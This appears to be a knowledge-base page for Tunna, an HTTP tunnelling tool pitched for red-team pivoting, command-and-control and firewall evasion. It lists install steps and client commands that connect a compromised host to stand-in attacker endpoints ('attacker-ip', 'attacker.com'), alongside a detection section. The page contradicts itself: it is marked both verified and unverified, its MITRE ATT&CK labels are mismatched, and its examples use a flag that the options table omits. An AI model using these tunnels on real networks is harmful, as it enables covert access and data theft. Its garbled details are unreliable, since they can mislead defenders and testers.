---
id: 9aae955f-cf4b-4624-be27-db2e4404bb46
name: Tunna
type: tool
verified: true
created_at: '2019-08-28T21:17:19.198024+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - tunneling
  - http-tunnel
  - firewall-bypass
  - proxy
url: 'https://github.com/AndresRumbo/Tunna'
validated: true
---

# Tunna

**Status**: Unverified

## Overview

Tunna is a set of PHP-based tools designed to wrap and tunnel any TCP communication over HTTP. It is particularly useful in penetration testing and red team operations to bypass network restrictions in fully firewalled environments, allowing attackers to maintain command-and-control (C2) channels or exfiltrate data through HTTP/HTTPS proxies.

## Description

Tunna operates by creating an HTTP tunnel for TCP traffic, enabling the forwarding of protocols like SOCKS over HTTP. The tool consists of a server component (run on the attacker's side) and a client component (run on the target or pivot host). It supports both HTTP and HTTPS, making it suitable for evading web application firewalls (WAFs) and strict egress filtering that only allows HTTP traffic. Common use cases include pivoting through compromised web servers, tunneling SSH or database connections, and establishing persistent backdoors in restricted networks.

## Features

- Feature 1: TCP over HTTP tunneling for arbitrary protocols (SOCKS5 support)
- Feature 2: Client-server architecture for bidirectional communication
- Feature 3: HTTPS support for encrypted tunneling
- Feature 4: Lightweight PHP implementation, no compilation required
- Feature 5: Configurable ports and endpoints for flexibility

## Installation

### Requirements

- PHP 5.3+ (with cURL extension for HTTP requests)
- Git for cloning the repository
- Network access to the target HTTP endpoint

### Install Commands

```bash
# Clone the repository
sudo apt update && sudo apt install php-curl git -y
git clone https://github.com/AndresRumbo/Tunna.git
cd Tunna
# No further installation needed; run directly with PHP
```

For Windows/macOS, use equivalent package managers (e.g., XAMPP for PHP, Homebrew for macOS).

## Basic Usage

```php
php tunnel.php --help
```

This displays available options, including modes (server/client), ports, and connection details.

### Common Options

| Option | Description |
|--------|-------------|
| -mode server/client | Specifies the operational mode |
| -l, --listen | Local port to listen on |
| -c, --connect | URL of the remote tunnel endpoint |
| -p, --port | Remote HTTP port (default 80) |
| -v | Verbose logging (if supported) |

## Examples

### Example 1: Basic Usage

Start server on attacker machine:

```php
php tunnel.php -mode server -l 1080
```

Start client on target:

```php
php tunnel.php -c http://attacker-ip/tunnel.php -p 80 -L 1080
```

### Example 2: Advanced Usage

HTTPS tunneling:

Server:
```php
php tunnel.php -mode server -l 1080
```

Client:
```php
php tunnel.php -c https://attacker.com/tunnel.php -p 443 -L 1080
```

Once established, use tools like `ssh -D 1080 user@target` on the attacker side to route traffic through the tunnel.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Connection Proxy]] Proxy (tunneling via HTTP to chain proxies)
- [[Protocol Tunneling]] Data from Local System (exfiltrating data over HTTP tunnels)
- [[Communication Through Removable Media]] Communication Through Removable Media (adapted for network pivoting)

### Tactics

- [[Command and Control]] Command and Control
- [[Lateral Movement]] Lateral Movement

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Unusual HTTP POST requests with binary payloads or high volume from PHP processes
- Detection method 2: Network traffic analysis showing TCP over HTTP patterns (e.g., via Zeek or Suricata rules for HTTP tunneling)
- Detection method 3: Process monitoring for `php tunnel.php` executions on endpoints
- Detection method 4: Proxy logs revealing connections to suspicious tunnel endpoints

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Socat]] (alternative tunneling tool)
- [[tools/Chisel]] (Go-based HTTP tunnel)

## References

- Official GitHub: https://github.com/AndresRumbo/Tunna
- Related resources: HTTP Tunneling Techniques in Penetration Testing (various blogs)
